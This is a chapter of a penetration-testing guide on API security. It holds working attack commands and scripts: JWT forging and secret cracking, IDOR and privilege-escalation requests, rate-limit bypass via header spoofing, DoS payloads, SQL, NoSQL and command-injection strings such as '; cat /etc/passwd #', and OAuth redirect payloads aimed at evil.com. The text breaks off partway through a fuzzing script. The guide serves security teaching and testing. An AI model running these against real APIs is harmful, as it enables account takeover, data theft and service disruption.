# Chapter 1: API Security Testing

## Table of Contents
1. [Introduction to API Security Testing](#introduction)
2. [REST API Penetration Testing](#rest-api-pentesting)
3. [GraphQL Security Assessment](#graphql-security)
4. [Authentication and Authorization Bypass](#auth-bypass)
5. [BOLA and BFLA Vulnerabilities](#bola-bfla)
6. [Rate Limiting and Resource Exhaustion](#rate-limiting)
7. [JWT Security and Token Attacks](#jwt-attacks)
8. [OAuth 2.0 and OpenID Connect Security](#oauth-security)
9. [API Fuzzing and Automated Testing](#api-fuzzing)
10. [API Security Testing Tools](#api-tools)
11. [Reporting and Remediation](#reporting)

---

## Introduction to API Security Testing

Application Programming Interfaces (APIs) have become the backbone of modern software architecture, enabling communication between microservices, mobile applications, and third-party integrations. With the proliferation of APIs comes an expanded attack surface that security professionals must thoroughly assess. This chapter provides a comprehensive guide to API security testing, covering everything from RESTful services to GraphQL implementations, authentication mechanisms, and advanced exploitation techniques.

### Understanding API Architecture

APIs serve as the glue between systems, allowing data exchange and functionality sharing across disparate platforms. The three primary API architectures encountered during penetration testing include:

**REST (Representational State Transfer)**: The most prevalent architectural style, utilizing HTTP methods (GET, POST, PUT, DELETE) to manipulate resources identified by URIs. REST APIs typically exchange data in JSON or XML format and follow stateless communication principles.

**GraphQL**: A query language and runtime developed by Facebook that allows clients to request exactly the data they need. Unlike REST, GraphQL uses a single endpoint and enables complex, nested queries that can potentially expose more data than intended.

**SOAP (Simple Object Access Protocol)**: An older protocol using XML for message format and typically operating over HTTP or SMTP. While less common in modern applications, SOAP APIs remain prevalent in enterprise environments.

### API Security Testing Methodology

A systematic approach to API security testing ensures comprehensive coverage of potential vulnerabilities. The methodology follows these phases:

**Reconnaissance and Discovery**: Identifying API endpoints, understanding the API structure, documenting available resources, and mapping the attack surface. This phase involves analyzing API documentation, intercepting traffic, and discovering hidden endpoints.

**Authentication and Session Management Testing**: Evaluating how the API verifies identity and maintains sessions. This includes testing for weak credentials, session fixation, token expiration issues, and authentication bypass techniques.

**Authorization and Access Control Testing**: Assessing whether users can access resources and perform actions beyond their intended privileges. This phase focuses on horizontal and vertical privilege escalation, broken object-level authorization (BOLA), and function-level authorization (BFLA).

**Input Validation and Injection Testing**: Testing for SQL injection, NoSQL injection, command injection, XML external entity (XXE) attacks, and other input-based vulnerabilities specific to API parameters and payloads.

**Business Logic and Application Flow Testing**: Analyzing the API's business logic for flaws that could be exploited to circumvent intended workflows, such as purchasing items at negative prices or bypassing payment steps.

**Rate Limiting and Resource Management Testing**: Evaluating protections against brute force attacks, denial of service, and resource exhaustion scenarios.

---

## REST API Penetration Testing

REST APIs present unique security challenges due to their stateless nature and reliance on standard HTTP methods. Understanding how to thoroughly test REST APIs requires familiarity with HTTP protocols, authentication mechanisms, and common vulnerability patterns.

### API Discovery and Reconnaissance

The first step in REST API penetration testing is discovering all available endpoints and understanding the API structure. Several techniques facilitate comprehensive discovery:

**Traffic Analysis**: Intercepting application traffic using tools like Burp Suite, OWASP ZAP, or mitmproxy reveals API calls made by legitimate clients. Configure your interception proxy and browse the application normally, paying attention to XHR/Fetch requests in browser developer tools.

```bash
# Using mitmproxy to capture API traffic
mitmproxy --mode reverse:http://target-api.com:8080

# Filter for API calls in mitmproxy
~u /api/
```

**Documentation Analysis**: Many APIs include documentation endpoints that attackers can exploit. Common documentation locations include:
- `/swagger-ui.html`
- `/swagger.json`
- `/api-docs`
- `/openapi.json`
- `/v2/api-docs`

**Robots.txt and Sitemap Analysis**: Check `robots.txt` and `sitemap.xml` for references to API endpoints that developers intended to hide from search engines.

```bash
# Discover API endpoints through common paths
curl -s https://target.com/robots.txt | grep -i api
curl -s https://target.com/sitemap.xml | grep -oP 'https?://[^"<>]+' | grep -i api
```

**Content Discovery**: Use tools like ffuf, dirb, or gobuster to brute-force API endpoints:

```bash
# Fuzzing for API endpoints with ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt \
     -u https://target.com/FUZZ \
     -mc 200,201,401,403,405 \
     -t 50

# API-specific wordlist approach
gobuster dir -u https://target.com/api/v1 \
             -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints.txt \
             -x json,xml,txt
```

**JavaScript Analysis**: Modern single-page applications (SPAs) often contain hardcoded API endpoints in their JavaScript bundles. Deobfuscate and analyze JavaScript files:

```bash
# Extract API endpoints from JavaScript files
curl -s https://target.com/app.js | grep -oP 'https?://[^"<>]+' | sort -u
curl -s https://target.com/app.js | grep -oP '/api/[^"<>]+' | sort -u
```

### REST API Authentication Testing

REST APIs employ various authentication mechanisms, each with specific testing considerations:

#### API Key Authentication

API keys are commonly passed in headers, query parameters, or cookies. Testing should evaluate:

```bash
# Common API key header locations
curl -H "X-API-Key: key_here" https://api.target.com/v1/data
curl -H "Authorization: ApiKey key_here" https://api.target.com/v1/data
curl "https://api.target.com/v1/data?api_key=key_here"

# Test for key exposure in logs by sending via query parameter
# Then check server logs or error messages for key disclosure
```

**API Key Security Testing**:
1. **Key Entropy Analysis**: Analyze whether API keys have sufficient randomness
2. **Key Transmission Security**: Verify keys are never sent over unencrypted channels
3. **Key Storage**: Check client-side code for hardcoded keys
4. **Key Rotation**: Test if keys can be revoked and rotated

#### Bearer Token Authentication (OAuth 2.0 / JWT)

Bearer tokens typically use the Authorization header:

```bash
# Standard Bearer token usage
curl -H "Authorization: Bearer <token>" https://api.target.com/v1/protected

# Test for token leakage in error messages
curl -H "Authorization: Bearer invalid_token" https://api.target.com/v1/protected -v
```

#### HTTP Basic Authentication

```bash
# Basic auth testing
curl -u username:password https://api.target.com/v1/protected

# Test for weak credentials
curl -u admin:admin https://api.target.com/v1/admin
```

### HTTP Method Testing

REST APIs use HTTP methods to perform CRUD operations. Testing should verify proper method implementation:

```bash
# Test for method support on various endpoints
curl -X GET https://api.target.com/v1/users/123
curl -X POST https://api.target.com/v1/users/123
curl -X PUT https://api.target.com/v1/users/123
curl -X DELETE https://api.target.com/v1/users/123
curl -X PATCH https://api.target.com/v1/users/123

# Test for method override headers
curl -X POST \
     -H "X-HTTP-Method-Override: DELETE" \
     https://api.target.com/v1/users/123

curl -X POST \
     -H "X-Method-Override: PUT" \
     https://api.target.com/v1/users/123
```

**HTTP Method Tampering**: Some APIs implement access control only for specific methods while leaving others unprotected:

```bash
# If DELETE is blocked, try alternative methods
curl -X POST -d "_method=DELETE" https://api.target.com/v1/users/123
curl -X POST -d "method_override=DELETE" https://api.target.com/v1/users/123
```

### Content-Type Negotiation Testing

REST APIs often accept multiple content types, which can lead to security issues:

```bash
# Test different Content-Type headers
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"user":"admin","pass":"password"}' \
     https://api.target.com/v1/login

curl -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "user=admin&pass=password" \
     https://api.target.com/v1/login

curl -X POST \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0"?><user>admin</user>' \
     https://api.target.com/v1/login
```

### REST API Parameter Testing

Parameters in REST APIs can be passed through multiple vectors:

**Query Parameters**:
```bash
# Test for mass assignment
curl "https://api.target.com/v1/users?role=admin&isAdmin=true"

# Test for parameter pollution
curl "https://api.target.com/v1/users?id=123&id=124"
```

**Path Parameters**:
```bash
# IDOR testing with path parameters
curl https://api.target.com/v1/users/123/orders/456
curl https://api.target.com/v1/users/124/orders/456  # Another user's order
curl https://api.target.com/v1/users/../admin/orders  # Path traversal
```

**Body Parameters**:
```bash
# Test for unexpected parameters
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{
       "username": "test",
       "password": "test123",
       "role": "admin",
       "isVerified": true
     }' \
     https://api.target.com/v1/register
```

### API Version Testing

API versioning can introduce security issues when older versions remain accessible:

```bash
# Common version patterns to test
curl https://api.target.com/v1/users/123
curl https://api.target.com/v2/users/123
curl https://api.target.com/1.0/users/123
curl https://api.target.com/2.0/users/123
curl https://api.target.com/api/v1/users/123
curl https://api.target.com/api/beta/users/123

# Header-based versioning
curl -H "Accept: application/vnd.api.v1+json" https://api.target.com/users/123
curl -H "API-Version: 1.0" https://api.target.com/users/123
```

---

## GraphQL Security Assessment

GraphQL represents a paradigm shift from REST, offering clients the ability to request precisely the data they need. However, this flexibility introduces unique security challenges that penetration testers must understand.

### GraphQL Discovery and Introspection

GraphQL APIs typically expose a single endpoint, often at `/graphql`:

```bash
# Common GraphQL endpoints
curl -X POST https://target.com/graphql
curl -X POST https://target.com/api/graphql
curl -X POST https://api.target.com/graphql
curl -X POST https://target.com/graphql/v1
```

**Introspection Query**: GraphQL's introspection feature allows querying the schema structure:

```graphql
# Full introspection query
{
  __schema {
    queryType {
      name
      fields {
        name
        type {
          name
          kind
        }
        args {
          name
          type {
            name
            kind
          }
        }
      }
    }
    mutationType {
      name
      fields {
        name
        type {
          name
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
    subscriptionType {
      name
    }
    types {
      name
      kind
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

Execute the introspection query:

```bash
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"query": "{ __schema { queryType { name fields { name } } } }"}' \
     https://target.com/graphql
```

**GraphQL Voyager**: Visualize discovered schemas using GraphQL Voyager:

```bash
# Install and run GraphQL Voyager
npm install -g graphql-voyager
graphql-voyager --schema schema.json
```

### GraphQL Query Analysis

Understanding query structure is essential for security testing:

```graphql
# Basic query structure
query GetUser($id: ID!) {
  user(id: $id) {
    id
    name
    email
    posts {
      title
      content
    }
  }
}
```

**Deep Recursion Testing**: GraphQL's nested nature can lead to resource exhaustion:

```graphql
# Deeply nested query causing resource exhaustion
query DeepNesting {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

**Alias-Based DoS**: Using aliases to execute the same resource-intensive operation multiple times:

```graphql
# Alias-based batch attack
query AliasAttack {
  a1: expensiveOperation
  a2: expensiveOperation
  a3: expensiveOperation
  # ... hundreds of aliases
  a100: expensiveOperation
}
```

### GraphQL Injection Attacks

GraphQL can be vulnerable to injection if resolvers don't properly sanitize inputs:

**SQL Injection via GraphQL**:
```graphql
# SQL injection in GraphQL argument
query SQLi {
  user(id: "1' OR '1'='1") {
    name
    email
  }
}

# In mutation
mutation CreateUser {
  createUser(input: {
    username: "admin' OR '1'='1",
    password: "password"
  }) {
    id
  }
}
```

**NoSQL Injection**:
```graphql
# MongoDB injection
query NoSQLi {
  users(filter: '{"$ne": null}') {
    name
    email
  }
}
```

**OS Command Injection**:
```graphql
mutation ExecuteCommand {
  runReport(input: {
    filename: "; cat /etc/passwd #"
  }) {
    result
  }
}
```

### GraphQL Authorization Bypass

GraphQL typically relies on resolver-level authorization, which can be bypassed:

**Field-Level Access Control Bypass**:
```graphql
# Requesting fields that should be restricted
query GetAdminData {
  user(id: "1") {
    id
    name
    email
    ssn  # Sensitive field that might not be properly protected
    salary  # Another sensitive field
    passwordResetToken
  }
}
```

**Mutation Authorization Bypass**:
```graphql
# Attempting privileged mutations
mutation EscalatePrivileges {
  updateUser(id: "1", input: {
    role: "ADMIN"
  }) {
    id
    role
  }
}
```

### GraphQL Batch Attacks

GraphQL supports query batching, which can be exploited:

```json
[
  {"query": "query { user(id: \"1\") { email } }"},
  {"query": "query { user(id: \"2\") { email } }"},
  {"query": "query { user(id: \"3\") { email } }"},
  {"query": "query { user(id: \"4\") { email } }"},
  {"query": "query { user(id: \"5\") { email } }"}
]
```

This batching capability can bypass rate limiting and enable efficient data harvesting.

### GraphQL Tools

```bash
# Install GraphQL CLI tools
npm install -g graphql-cli

# GraphQL Playground for interactive testing
npm install -g graphql-playground-react

# InQL - GraphQL security testing tool
git clone https://github.com/doyensec/inql.git
cd inql && pip install -r requirements.txt
python inql.py -t https://target.com/graphql

# GraphQLmap - GraphQL exploitation tool
git clone https://github.com/swisskyrepo/GraphQLmap.git
cd GraphQLmap
python graphqlmap.py -u https://target.com/graphql
```

---

## Authentication and Authorization Bypass

API authentication and authorization mechanisms are frequent targets for attackers. Understanding common bypass techniques is essential for comprehensive security testing.

### Authentication Bypass Techniques

**NULL/Empty Authentication**:
```bash
# Test with empty authorization header
curl -H "Authorization:" https://api.target.com/v1/admin

# Test with whitespace
curl -H "Authorization: " https://api.target.com/v1/admin

# Test case sensitivity variations
curl -H "authorization: Bearer token" https://api.target.com/v1/admin
curl -H "AUTHORIZATION: Bearer token" https://api.target.com/v1/admin
```

**JWT None Algorithm Bypass**:
```python
import jwt
import base64
import json

# Create a JWT with 'none' algorithm
def create_none_jwt(payload, original_header):
    header = json.loads(base64.b64decode(original_header + '=='))
    header['alg'] = 'none'
    
    new_header = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')
    
    return f"{new_header}.{new_payload}."

# Usage
token = create_none_jwt(
    {"user": "admin", "role": "administrator"},
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
)
print(token)
```

**JWT Algorithm Confusion (RS256 to HS256)**:
```python
import jwt

# If you have the public key, try signing with HMAC using the public key
public_key = open('public.pem', 'r').read()

token = jwt.encode(
    {"user": "admin", "role": "admin"},
    key=public_key,
    algorithm='HS256'
)
print(token)
```

**Weak JWT Secret Brute Force**:
```bash
# Using hashcat for JWT secret cracking
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Using jwt_tool for comprehensive JWT testing
python jwt_tool.py -t "eyJ0eXAiOiJKV1Qi..." -C -d /usr/share/wordlists/rockyou.txt
```

**API Key Manipulation**:
```bash
# Test for key format variations
curl -H "X-API-Key: admin" https://api.target.com/v1/admin
curl -H "X-API-Key: null" https://api.target.com/v1/admin
curl -H "X-API-Key: true" https://api.target.com/v1/admin

# Test array-based bypass
curl -H "X-API-Key: []" https://api.target.com/v1/admin
curl -H "X-API-Key: {}" https://api.target.com/v1/admin
```

### Authorization Testing Methodology

**Horizontal Privilege Escalation (IDOR)**:
```bash
# Test direct object references
curl https://api.target.com/v1/users/123/profile  # Your user
curl https://api.target.com/v1/users/124/profile  # Another user
curl https://api.target.com/v1/users/1/profile    # Admin?

# Test with different ID formats
curl https://api.target.com/v1/users/000123/profile
curl https://api.target.com/v1/users/123.0/profile
curl https://api.target.com/v1/users/123/profile?user_id=124
```

**Vertical Privilege Escalation**:
```bash
# Test role parameter manipulation
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"username":"test","password":"test","role":"admin"}' \
     https://api.target.com/v1/register

# Test privilege escalation via user update
curl -X PUT \
     -H "Authorization: Bearer <user_token>" \
     -H "Content-Type: application/json" \
     -d '{"role":"admin","isAdmin":true}' \
     https://api.target.com/v1/users/me
```

---

## BOLA and BFLA Vulnerabilities

Broken Object Level Authorization (BOLA) and Broken Function Level Authorization (BFLA) represent the most common and critical API vulnerabilities according to the OWASP API Security Top 10.

### Broken Object Level Authorization (BOLA/IDOR)

BOLA occurs when APIs expose endpoints that handle object identifiers without proper authorization checks. Attackers can manipulate these identifiers to access unauthorized data.

**BOLA Detection Techniques**:

```bash
# Sequential ID testing
curl https://api.target.com/v1/orders/1001
curl https://api.target.com/v1/orders/1002
curl https://api.target.com/v1/orders/1003

# Predictable GUID patterns
curl https://api.target.com/v1/documents/550e8400-e29b-41d4-a716-446655440000
curl https://api.target.com/v1/documents/550e8400-e29b-41d4-a716-446655440001

# Wildcard ID access
curl https://api.target.com/v1/orders/*
curl https://api.target.com/v1/orders/%
curl https://api.target.com/v1/orders/all
```

**IDOR in Query Parameters**:
```bash
# Multiple parameter testing
curl "https://api.target.com/v1/reports?user_id=123"
curl "https://api.target.com/v1/reports?user_id=124"

# Array parameter injection
curl "https://api.target.com/v1/reports?user_id[]=123&user_id[]=124"

# Parameter pollution
curl "https://api.target.com/v1/reports?user_id=123&user_id=124"
```

**IDOR in Request Body**:
```bash
# Body parameter manipulation
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{
       "from_account": "12345",
       "to_account": "67890",
       "amount": 100
     }' \
     https://api.target.com/v1/transfer

# Attempt unauthorized transfer
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{
       "from_account": "11111",
       "to_account": "12345",
       "amount": 10000
     }' \
     https://api.target.com/v1/transfer
```

**BOLA in GraphQL**:
```graphql
# Query another user's data
query {
  user(id: "another_user_id") {
    email
    phoneNumber
    address
    orders {
      total
      items {
        name
        price
      }
    }
  }
}
```

### Broken Function Level Authorization (BFLA)

BFLA occurs when API endpoints lack proper authorization checks, allowing users to perform administrative functions.

**BFLA Testing Methodology**:

```bash
# Test administrative endpoints with regular user token
curl -H "Authorization: Bearer <regular_user_token>" \
     https://api.target.com/v1/admin/users

curl -H "Authorization: Bearer <regular_user_token>" \
     -X DELETE \
     https://api.target.com/v1/admin/users/123

curl -H "Authorization: Bearer <regular_user_token>" \
     -X POST \
     -d '{"role":"admin"}' \
     https://api.target.com/v1/admin/users/123/role
```

**HTTP Method-Based BFLA**:
```bash
# Regular user can only GET
curl -H "Authorization: Bearer <user_token>" \
     -X GET https://api.target.com/v1/users/123

# But what about other methods?
curl -H "Authorization: Bearer <user_token>" \
     -X PUT \
     -d '{"email":"attacker@evil.com"}' \
     https://api.target.com/v1/users/123

curl -H "Authorization: Bearer <user_token>" \
     -X DELETE \
     https://api.target.com/v1/users/123
```

**BFLA in Different API Versions**:
```bash
# Admin functionality might exist in older versions
curl -H "Authorization: Bearer <user_token>" \
     https://api.target.com/v1/admin/config
curl -H "Authorization: Bearer <user_token>" \
     https://api.target.com/v2/admin/config
```

---

## Rate Limiting and Resource Exhaustion

Rate limiting is essential for API security, preventing abuse, brute force attacks, and denial of service. Testing these protections ensures they are properly implemented.

### Rate Limit Testing Methodology

**Basic Rate Limit Detection**:
```bash
# Send multiple requests and observe responses
for i in {1..100}; do
    curl -s -o /dev/null -w "%{http_code}\n" \
         https://api.target.com/v1/users/123
done

# Watch for 429 (Too Many Requests) or 503 (Service Unavailable)
```

**Bypass Techniques**:

```bash
# IP-based bypass using headers
curl -H "X-Forwarded-For: 1.2.3.4" https://api.target.com/v1/data
curl -H "X-Real-IP: 1.2.3.4" https://api.target.com/v1/data
curl -H "X-Originating-IP: 1.2.3.4" https://api.target.com/v1/data
curl -H "X-Forwarded-Host: 1.2.3.4" https://api.target.com/v1/data
curl -H "X-Remote-IP: 1.2.3.4" https://api.target.com/v1/data
curl -H "X-Client-IP: 1.2.3.4" https://api.target.com/v1/data
curl -H "X-Remote-Addr: 1.2.3.4" https://api.target.com/v1/data

# Multiple IPs in X-Forwarded-For
curl -H "X-Forwarded-For: 1.2.3.4, 5.6.7.8" https://api.target.com/v1/data

# Case variations
curl -H "x-forwarded-for: 1.2.3.4" https://api.target.com/v1/data
```

**API Key/Token Rotation**:
```bash
# If rate limiting is per API key, rotate keys
API_KEYS=("key1" "key2" "key3" "key4" "key5")
for key in "${API_KEYS[@]}"; do
    curl -H "X-API-Key: $key" https://api.target.com/v1/data
done
```

**Distributed Attack Simulation**:
```python
# Using multiple proxies to distribute requests
import requests
from concurrent.futures import ThreadPoolExecutor

proxies = [
    {"http": "http://proxy1:8080", "https": "http://proxy1:8080"},
    {"http": "http://proxy2:8080", "https": "http://proxy2:8080"},
    # ... more proxies
]

def make_request(proxy):
    try:
        r = requests.get("https://api.target.com/v1/data", proxies=proxy, timeout=5)
        return r.status_code
    except:
        return None

with ThreadPoolExecutor(max_workers=50) as executor:
    results = list(executor.map(make_request, proxies * 100))
```

### Resource Exhaustion Testing

**CPU Exhaustion via Complex Operations**:
```graphql
# GraphQL resource exhaustion through complex queries
query ResourceExhaustion {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                name
              }
            }
          }
        }
      }
    }
  }
}
```

**Memory Exhaustion via Large Payloads**:
```bash
# Send extremely large JSON payload
curl -X POST \
     -H "Content-Type: application/json" \
     -d @huge_payload.json \
     https://api.target.com/v1/process

# Create huge payload
python3 -c "
import json
data = {'data': 'A' * 100000000}
print(json.dumps(data))
" > huge_payload.json
```

**Regular Expression DoS (ReDoS)**:
```bash
# Test regex-based validation with malicious patterns
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"email": "a@aaaaaaaaaaaaaaaaaaaaaaaaaaaa!.com"}' \
     https://api.target.com/v1/register

# Evil regex patterns that cause catastrophic backtracking
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"pattern": "(a+)+b", "input": "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}' \
     https://api.target.com/v1/validate
```

---

## JWT Security and Token Attacks

JSON Web Tokens (JWT) are ubiquitous in modern API authentication. Understanding their structure and potential vulnerabilities is crucial for security testing.

### JWT Structure Analysis

A JWT consists of three parts separated by dots:
- Header: Algorithm and token type
- Payload: Claims and data
- Signature: Verification signature

```python
import base64
import json

def decode_jwt(token):
    parts = token.split('.')
    
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    print("Header:", json.dumps(header, indent=2))
    print("Payload:", json.dumps(payload, indent=2))
    print("Signature:", parts[2])
    
    return header, payload

# Example usage
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMe..."
decode_jwt(token)
```

### JWT Signature Bypass

**The "none" Algorithm**:
```python
import base64
import json

def strip_signature(token):
    """Convert signed JWT to unsigned by changing alg to none"""
    parts = token.split('.')
    
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    header['alg'] = 'none'
    
    new_header = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    return f"{new_header}.{parts[1]}."

# Usage with curl
new_token = strip_signature(original_token)
curl -H "Authorization: Bearer $new_token" https://api.target.com/v1/admin
```

**Algorithm Confusion Attack**:
```python
import jwt

# If the server uses RS256 (asymmetric) but also accepts HS256 (symmetric)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Sign with public key using HMAC
malicious_token = jwt.encode(
    {"user": "admin", "role": "administrator"},
    key=public_key,
    algorithm='HS256'
)
```

### JWT Secret Cracking

**Dictionary Attack**:
```bash
# Using jwt_tool
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -C -d /usr/share/wordlists/rockyou.txt

# Using hashcat
hashcat -m 16500 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

# Using john
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
```

**Brute Force with Known Weak Secrets**:
```python
import jwt
import itertools

# Brute force weak secrets
weak_secrets = ['secret', 'password', '123456', 'jwt', 'api', 'key']

def brute_jwt(token, secrets):
    for secret in secrets:
        try:
            decoded = jwt.decode(token, secret, algorithms=['HS256'])
            print(f"Found secret: {secret}")
            return decoded
        except jwt.InvalidSignatureError:
            continue
    return None
```

### JWT Claim Manipulation

**Expiration Time Manipulation**:
```python
import time
import jwt

# Extend token expiration
def extend_token(token, secret, new_exp):
    payload = jwt.decode(token, secret, algorithms=['HS256'])
    payload['exp'] = new_exp
    return jwt.encode(payload, secret, algorithm='HS256')

# Usage
new_token = extend_token(
    original_token, 
    'discovered_secret',
    int(time.time()) + 86400 * 365  # Extend 1 year
)
```

**Role Escalation via Claims**:
```python
# Modify JWT claims
def escalate_privileges(token, secret):
    payload = jwt.decode(token, secret, algorithms=['HS256'])
    
    # Common privilege escalation claims
    payload['role'] = 'admin'
    payload['isAdmin'] = True
    payload['admin'] = True
    payload['privileges'] = ['admin', 'superuser']
    payload['permissions'] = '*'
    
    return jwt.encode(payload, secret, algorithm='HS256')
```

---

## OAuth 2.0 and OpenID Connect Security

OAuth 2.0 and OpenID Connect (OIDC) are complex protocols with numerous potential security issues. Understanding these vulnerabilities is essential for comprehensive API security testing.

### OAuth 2.0 Flow Analysis

**Authorization Code Flow Testing**:
```bash
# Step 1: Initiate authorization
curl "https://auth.target.com/oauth/authorize?\
response_type=code&\
client_id=CLIENT_ID&\
redirect_uri=https://app.target.com/callback&\
scope=read write&\
state=RANDOM_STATE"

# Step 2: Exchange code for token (after user authorization)
curl -X POST \
     -d "grant_type=authorization_code" \
     -d "code=AUTH_CODE" \
     -d "client_id=CLIENT_ID" \
     -d "client_secret=CLIENT_SECRET" \
     -d "redirect_uri=https://app.target.com/callback" \
     https://auth.target.com/oauth/token
```

### OAuth 2.0 Security Testing

**Redirect URI Validation Bypass**:
```bash
# Open redirect via path traversal
curl "https://auth.target.com/oauth/authorize?\
response_type=code&\
client_id=CLIENT_ID&\
redirect_uri=https://app.target.com/callback/../../evil.com"

# Open redirect via @ symbol
curl "https://auth.target.com/oauth/authorize?\
response_type=code&\
client_id=CLIENT_ID&\
redirect_uri=https://evil.com@app.target.com/callback"

# Open redirect via # fragment
curl "https://auth.target.com/oauth/authorize?\
response_type=code&\
client_id=CLIENT_ID&\
redirect_uri=https://app.target.com/callback#evil.com"

# Subdomain takeover
curl "https://auth.target.com/oauth/authorize?\
response_type=code&\
client_id=CLIENT_ID&\
redirect_uri=https://evil.target.com/callback"
```

**Authorization Code Interception**:
```bash
# PKCE bypass testing
curl -X POST \
     -d "grant_type=authorization_code" \
     -d "code=CODE" \
     -d "client_id=CLIENT_ID" \
     -d "code_challenge=" \
     https://auth.target.com/oauth/token

# Without code_verifier when PKCE is enforced
curl -X POST \
     -d "grant_type=authorization_code" \
     -d "code=CODE" \
     -d "client_id=CLIENT_ID" \
     https://auth.target.com/oauth/token
```

**Scope Escalation**:
```bash
# Request additional scopes
curl "https://auth.target.com/oauth/authorize?\
response_type=code&\
client_id=CLIENT_ID&\
redirect_uri=https://app.target.com/callback&\
scope=read write admin delete *"

# Array-based scope injection
curl "https://auth.target.com/oauth/authorize?\
response_type=code&\
client_id=CLIENT_ID&\
redirect_uri=https://app.target.com/callback&\
scope[]=read&scope[]=admin"
```

**Token Endpoint Testing**:
```bash
# Client credentials grant
curl -X POST \
     -u "client_id:client_secret" \
     -d "grant_type=client_credentials" \
     -d "scope=admin" \
     https://auth.target.com/oauth/token

# Password grant (if enabled)
curl -X POST \
     -d "grant_type=password" \
     -d "username=victim" \
     -d "password=password" \
     -d "client_id=CLIENT_ID" \
     -d "client_secret=CLIENT_SECRET" \
     https://auth.target.com/oauth/token

# Refresh token abuse
curl -X POST \
     -d "grant_type=refresh_token" \
     -d "refresh_token=REFRESH_TOKEN" \
     -d "client_id=CLIENT_ID" \
     -d "scope=admin superuser" \
     https://auth.target.com/oauth/token
```

### OpenID Connect Security

**ID Token Validation Bypass**:
```bash
# Test signature validation
# Extract ID token and modify claims without invalidating signature

# Test audience validation
curl -X POST \
     -H "Authorization: Bearer ACCESS_TOKEN" \
     -d "id_token=ID_TOKEN_FROM_ANOTHER_APP" \
     https://api.target.com/v1/verify

# Test issuer validation
curl -X POST \
     -H "Authorization: Bearer ACCESS_TOKEN" \
     -d "id_token=TOKEN_WITH_DIFFERENT_ISSUER" \
     https://api.target.com/v1/verify
```

**UserInfo Endpoint Testing**:
```bash
# Access UserInfo with different tokens
curl -H "Authorization: Bearer ACCESS_TOKEN" \
     https://auth.target.com/oauth/userinfo

# Test for additional claims leakage
curl -H "Authorization: Bearer ACCESS_TOKEN" \
     -H "Accept: application/json" \
     https://auth.target.com/oauth/userinfo?include=admin,sensitive
```

---

## API Fuzzing and Automated Testing

Automated fuzzing is essential for discovering vulnerabilities that manual testing might miss. This section covers tools and techniques for comprehensive API fuzzing.

### REST API Fuzzing

**Endpoint Fuzzing with ffuf**:
```bash
# Fuzz API endpoints
ffuf -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt \
     -u https://api.target.com/v1/FUZZ \
     -mc 200,201,204,401,403,405 \
     -t 50 \
     -o results.json

# Fuzz with multiple methods
ffuf -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt:ENDPOINT \
     -w methods.txt:METHOD \
     -X METHOD \
     -u https://api.target.com/v1/ENDPOINT \
     -mc 200,201,204,401,403
```

**Parameter Fuzzing**:
```bash
# Fuzz query parameters
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "https://api.target.com/v1/users?FUZZ=test" \
     -mc 200 \
     -fs 0

# Fuzz JSON parameters
cat > param_fuzz.json << 'EOF'
{
  "FUZZ": "test"
}
EOF

ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -d @param_fuzz.json \
     -u https://api.target.com/v1/users \
     -mc 200
```

**Value Fuzzing for Injection**:
```bash
# SQL injection payload fuzzing
ffuf -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"id": "FUZZ"}' \
     -u https://api.target.com/v1/users \
     -mr "SQL|syntax|error|mysql|postgres" \
     -t 30
```

### GraphQL Fuzzing

**Introspection-Based Fuzzing**:
```python
import requests
import json

def introspection_fuzz(endpoint):
    # Get schema
    introspection_query = {
        "query": "{ __schema { types { name fields { name args { name type { name } } } } } }"
    }
    
    r = requests.post(endpoint, json=introspection_query)
    schema = r.json()
    
    # Fuzz each field with edge cases
    edge_cases = ["", "null", "undefined", "[]", "{}", "'", '"', "/**/,", ";", "\\", "0x00"]
    
    for type_info in schema['data']['__schema']['types']:
        if type_info['fields']:
            for field in type_info['fields']:
                for edge in edge_cases:
                    test_query = {
                        "query": f"{{ {field['name']}(id: \"{edge}\") {{ id }} }}"
                    }
